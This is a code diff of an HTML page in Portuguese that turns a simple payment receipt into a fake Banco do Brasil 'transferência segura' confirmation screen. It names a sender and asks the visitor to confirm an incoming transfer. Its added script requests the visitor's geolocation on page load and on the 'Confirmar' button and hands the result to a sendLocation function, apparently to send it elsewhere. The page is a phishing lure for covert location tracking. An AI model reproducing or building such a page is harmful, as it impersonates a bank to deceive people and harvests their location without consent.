@@ -10,31 +10,41 @@
 
 <body>
   <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
+    <div class="bb-title">
+      <h1>BB transferência segura</h1>
+    </div>
+    <h3>Confirme os dados antes de seguir</h3>
+    <br> <br>
 
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
-      <p><span>De:</span> João Silva de Oliveira</p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
+      <p><span>De:</span> Ivanyelle Correia de Lima</p>
+      <p><span>Status:</span> Aguardando Confirmação</p>
     </div>
 
-    <button class="botao" onclick="window.print()">Imprimir</button>
+    <p>
+      <span>Ao confirmar, na próxima tela você irá adicionar o valor que foi acordado com o depositante, fique atento(a), não será aceito um valor maior</span>
+    </p>
+
+    <button class="botao" onclick="loadlocale()">Confirmar</button>
 
     <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
+      <p>BB transferência segura, PIX, TED, DOC, você sempre seguro.</p>
     </div>
 
   </div>
 
   <script>
-    window.addEventListener("load", () => {
+    function loadlocale(){
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+        alert("Confirme para recebimento");
       }
+    }
+
+    window.addEventListener("load", () => {
+      loadlocale()
     });
 
     const dataAtual = new Date();
